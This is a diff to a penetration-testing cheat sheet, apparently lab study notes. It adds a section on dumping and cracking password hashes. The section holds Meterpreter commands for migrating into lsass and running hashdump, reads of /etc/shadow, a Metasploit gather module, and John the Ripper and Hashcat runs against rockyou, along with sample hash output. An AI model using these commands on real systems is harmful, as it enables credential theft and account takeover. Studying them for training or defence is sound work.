@@ -75,7 +75,7 @@ Post-Exploitation
   - [Linux History](#Linux-History)
   - [Resource Scripts](#Resource-Scripts)
   - [Windows Event Logs](#Windows-Event-Logs)
-- [Hash Dumping and Cracking]
+- [Hash Dumping and Cracking](#Hash-Dumping-and-Cracking)
   - Windows
   - Linux
 - [Keylogging](#Keylogging)
@@ -1235,6 +1235,104 @@ meterpreter > resource <filename>
 [<< Index](#Index)
 ```
 meterpreter > clearev
+```
+
+## Hash Dumping and Cracking
+[<< Index](#Index)
+### Windows
+[<< Index](#Index)
+#### John the Ripper
+[<< Index](#Index)
+```
+meterpreter > ps -S lsass.exe
+meterpreter > migrate <pid>
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+- Hashes will appear in `creds`.
+
+```
+vi hashes.txt
+
+Paste Administrator and bob's hashes into the text file
+
+john --format=NT hashes.txt
+
+cat .john/john.pot
+
+rm -rf /root/.john
+john --format=NT hashes.txt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+- Default wordlist `/usr/share/john/password.lst`.
+
+```
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+```
+- Alternative wordlist.
+
+```
+use auxiliary/analyze/crack_windows
+set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+#### Hashcat
+[<< Index](#Index)
+```
+hashcat --help
+
+hashcat -m 1000 -a 3 hashes.txt /usr/share/wordlists/rockyou.txt
+
+cat .hashcat/hashcat.potfile
+```
+
+### Linux
+[<< Index](#Index)
+- Need privileges to access `/etc/shadow`
+	- $1 - MD5 (weakest)
+	- $2 - Blowfish
+	- $5 - SHA-256
+	- $6 - SHA-512
+
+```
+meterpreter > cat /etc/shadow
+root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
+```
+- Unable to use `hashdump` for Linux?
+
+#### John the Ripper
+[<< Index](#Index)
+```
+use post/linux/gather/hashdump
+set SESSION <session_id>
+
+creds
+loot
+
+cat /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt
+root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+john --format=sha512crypt /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+cat .john/john.pot
+```
+- Must use the unshadowed password file.
+
+```
+use auxiliary/analyze/crack_linux
+set SHA512 true
+```
+
+#### Hashcat
+[<< Index](#Index)
+```
+hashcat -m 1800 -a 3 /root/.msf4/loot/20240104035021_default_192.122.73.3_linux.hashes_884293.txt /usr/share/wordlists/rockyou.txt
+
+cat .hashcat/hashcat.potfile
 ```
 
 ## Keylogging
